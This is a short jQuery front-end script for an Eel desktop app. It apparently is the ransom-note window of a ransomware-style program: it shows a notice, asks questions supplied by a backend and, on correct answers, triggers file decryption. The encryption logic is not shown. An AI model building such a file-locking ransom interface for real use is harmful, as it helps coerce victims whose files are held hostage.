$(function() {
  var question_vals = [];

  $('#readmenotice').hide();
  $('#questions').hide();
  $('#decrypt').hide();

      setTimeout(function(){
        $('#readmenotice').fadeIn(700);
        setTimeout(function(){
          $('#notice').addClass('scale-in');
        }, 700);
      }, 1500);
      
  $("#btnexit").click(function(){
    eel.shutdown();
    close();
  }); 

  $("#btndecrypt").click(function(){
    $('#readmenotice').hide();
    $('#questions').show();
    showQuestions();
  });

  $('#btnback').click(function() {
    $('#questions').hide();
    $('#readmenotice').show();
  })

  function showQuestions() {
    eel.getQuestions()(r => {
      setContent(r);
    })
  }

  function setContent(l) {
    question_vals = [];
    $('#questions_content').html('');
    var c = ""
    for(var i=0;i<l.length; i++) {
      c += '<div class="input-field">'
      c += '<input id="q'+i+'" type="text" class="validate">'
      c += '<label for="q'+i+'">'+ l[i] + '</label>'
      c += '</div><br>'
      question_vals.push("q" + i)
    }
    $('#questions_content').html(c);
    $("#btnsubmitquestions").click(function() {
      checkQuestions();
    });

  }

  function checkQuestions() {
    l = []
    for(var i=0;i<question_vals.length;i++) {
      l.push($('#' + question_vals[i]).val())
    }
    eel.checkQuestions(l)(isCorrect => {
      if(isCorrect) {
        $('#questions').hide();
        $('#decrypt').show();
        console.log('atfer')
        eel.decryptData()    
      } else {
        alert('At least one Answer was wrong. Try again')
      }
    })
  }

  eel.expose(decrypt_success);
  function decrypt_success() {
    alert('Your Files have been decrypted. You can close this window now')
    close()
  }

  eel.expose(decrypt_fail);
  function decrypt_fail() {
    alert('Something went wrong while decrypting')
  }
});

